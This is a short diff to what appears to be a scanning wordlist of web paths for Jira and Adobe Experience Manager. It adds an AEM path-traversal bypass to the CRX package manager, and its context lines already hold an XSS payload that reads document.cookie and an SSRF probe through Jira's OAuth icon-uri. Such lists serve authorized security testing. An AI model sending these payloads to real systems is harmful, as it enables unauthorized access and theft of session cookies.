@@ -5266,3 +5266,4 @@ configurePortalPages.jspa
 plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true
 plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json
 secure/popups/UserPickerBrowser.jspa
+content/..;/crx/packmgr/teams.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true
